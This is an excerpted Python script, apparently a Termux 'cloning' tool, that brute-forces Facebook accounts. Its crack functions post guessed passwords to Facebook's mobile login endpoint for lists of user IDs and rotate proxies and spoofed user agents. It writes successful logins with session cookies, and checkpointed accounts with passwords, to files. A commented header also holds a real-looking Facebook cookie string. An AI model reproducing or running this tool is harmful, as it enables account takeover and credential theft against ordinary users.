#Open Source By Kawchar Vai
"""

REVERSE DONE BY  KAWCHAR VAI
...
print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mKING UPDATE...? ')
os.system("espeak -a 300 \"King,Update,\"")
time.sleep(2)
#os.system('clear')
...
time.sleep(2)
os.system(f'xdg-open https://t.me/GrowingStarAirdrop')
os.system(f'xdg-open https://www.facebook.com/Kawcharfb?mibextid=ZbWKwL')
##os.system("espeak -a 300 \"Enter,Username,and,password, \"")##
#------------------[ Kawchar-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ua = ["MOZILLA/5.0 (MACINTOSH; INTEL MAC OS X 10_11_1) APPLEWEBKIT/601.2.4 (KHTML, LIKE GECKO) VERSION/9.0.1 SAFARI/601.6.14 FACEBOOKEXTERNALHIT/1.1 FACEBOT TWITTERBOT/1.0",]
...
ua = ["WeRead/5.3.4 WRBrand/oneplus Dalvik/2.1.0 (Linux; U; Android 10; ONEPLUS A5010 Build/QKQ1.191014.012",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10; CGATES-DV8947 Build/QT",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 5.1; B3-A10 Build/LMY47I",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; SM-R875F Build/TWR5.230621.001",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-9-9-2-1",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; Pixel 3a Build/TQ3A.230901.001",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 7 Build/PQ3A.190505.002) AppleFacebookExternalHit/537.36 (KHTML, like Gecko)FacebookExternalHit",]
...
prinCP=[]
try:
    prox= requests.get('https://github.com/Kawchar03/BDMC/blob/main/.prox.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/Kawchar03/FILE_X/blob/main/tonmoy_ua.txt').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
    os.system('xdg-open https://facebook.com/groups/javascipttermuxcommmand/?ref=share_group_link')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('xdg-open https://www.facebook.com/Kawcharfb?mibextid=ZbWKwL')
logo =(f"""
   __ _____ _      _________ _____   ___    _   _____   ____
  / //_/ _ | | /| / / ___/ // / _ | / _ \  | | / / _ | /  _/
 / ,< / __ | |/ |/ / /__/ _  / __ |/ , _/  | |/ / __ |_/ /  
/_/|_/_/ |_|__/|__/\___/_//_/_/ |_/_/|_|   |___/_/ |_/___/  
                                                                                                                                     
 ___________________________________
CREATED BY = KAWCHAR VAI
FACEBOOK   = KAWCHAR ISLAM
OWNER      = KAWCHAR  VAI
COMMAND    = PAID BUT FOR YOU FREE
VERSION    = 0.1
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Kawchar03/Approvlal.txt/blob/main/Kawchar.txt').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      print(' \x1b[1;97m║══[𝟸] FREE-FIRE- ID CLONING')
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801762982952?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#os.system("python Kawchar.py")
def naima():
	print('-------------------')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;91m[\033[1;92m√\033[1;91m] \x1b[38;5;50mENTER YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  Kawchar,  V I P,  Tools"')
def back():
	login()
...
def menu():
    ...
    print('\033[0;97m____________________________________')
    ...
    print('\x1b[38;5;50║══=================')
    Kawchar = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if Kawchar in ['111']:
        login()
        dump_massal()
    elif Kawchar in ['1']:
        crack_file()
    elif Kawchar in ['2','02']:
        os.system('xdg-open https://github.com/Kawchar03')
        os.system("python nono.py")
    elif Kawchar in ['3','03']:
        result()
    elif Kawchar in ['0']:
...
def passwrd():
   ...
   # print("\033[1;91m[\033[1;92m√\033[1;91m] \033[41m\x1b[1;97m𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝚈𝙾𝚄𝚁 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚃𝙸𝙼𝙴\033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
    ...
    os.system("python Kawchar-6-3.py")
    exit()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Kawchar-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    # 'cookie': 'datr=sg-ZZWIJY-8_ar7I2B1AyQ4O; sb=sg-ZZdbvL4F-Lgw3uzGx17Sg; zsh=ASRs7DDi6a5bCwa7en0sdjpi0kADefTNax1tuH-1lBuW85ZNJsDsPSznbRx5Z3l4VBiU78ATbAqO3Xt77DmKu5oq36rW9xXRtdz0YAm7c8CimHEoo_nlDLiBQJciCJBCvKr8mrWVfLF53aH45RsCyubNMnY7DpWQIuxZmptzm31UfvSGJfqZPkH3wRGtJT6MOsGjS37erEMsJ2Rz-EizzO9TAQheKOOG0uZDgAkM2uxI0R2pnjGcHa7yPpInl1WdPgWPC_dEYAVNW9uvJOOvzDq9sYagUTDrU1X7YiVYCtGWikjMoZoFYFdGAZBHShoGq1_Erb5YbdQrd0i6dUptdYomBEPlvcUXybBHo-kr01xWlHXl; locale=en_US; vpd=v1%3B1072x552x1.1105930805206299; dpr=1.2210381031036377; m_pixel_ratio=1.2210381031036377; wd=1048x2034; fr=0sGoKk0GFdVHePjkZ.AWUTQfpTwKgRRoFv8AW5b1dy2gc.BlmQ-y.v_.AAA.0.0.BlmS3L.AWXocHBu8Go',
    ...
    'viewport-width': '980','}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mKawchar-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print('\x1b[38;5;50m===============================================')
                ...
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mKawchar-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " Kawchar,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[Kawchar-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({'Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Linux"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','dpr': '3','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"','sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"','sec-ch-ua-mobile': '?0','sec-ch-ua-model': '""','sec-ch-ua-platform': '"Linux"','sec-ch-ua-platform-version': '""','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': pro}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mKawchar-CP\033[1;91m] {idf} • {pw}')
                print('\x1b[38;5;50m============================')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Kawchar-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " Kawchar,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
